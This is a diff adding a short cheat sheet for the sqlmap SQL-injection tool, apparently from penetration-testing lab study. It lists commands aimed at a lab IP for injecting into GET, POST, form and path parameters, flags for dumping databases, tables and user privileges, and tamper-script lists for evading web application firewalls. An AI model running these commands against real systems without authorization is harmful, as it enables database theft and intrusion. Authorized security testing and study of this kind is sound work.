@@ -1,0 +1,47 @@
+SQLMAP
+
+GET
+sqlmap -u http://10.11.1.1:8000/path/uri.php?param=val
+sqlmap -u http://10.11.1.1:8000/path/uri.php?param1=val1&param2=val2
+POST
+sqlmap -u http://10.11.1.1:8000/path/uri.php --data "param=val" -p "param"
+sqlmap -u http://10.11.1.1:8000/path/uri.php --data "param1=val1&param2=val2&submit=do"
+Test all page forms
+sqlmap -u http://10.11.1.1:8000/path/uri.php --forms
+URL path parameters
+sqlmap -u http://10.11.1.1:8000/param*/uri.php
+	append asterix in path where path param=uri.php?id=param
+Test delimiter flags 
+--level 5
+	1 default
+	2 http cookie header testing
+	3 user-agent referer heading
+--risk 3
+Request parameter flags
+--cookie="param=value&1=2"
+--random-agent
+Data extraction flags
+--dump
+	-dump a table
+--dump-all
+	--exclude sysdbs
+--current-user
+--isdba
+	-is administrator?
+--dbs
+	-list databases
+--current-db
+--tables
+	-D db_name - resrict to current database
+--colums
+	-T table_name - restrict to specific table
+
+
+--tamper
+	General
+	tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+	MSSQL
+	tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+	MySQL
+	tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+
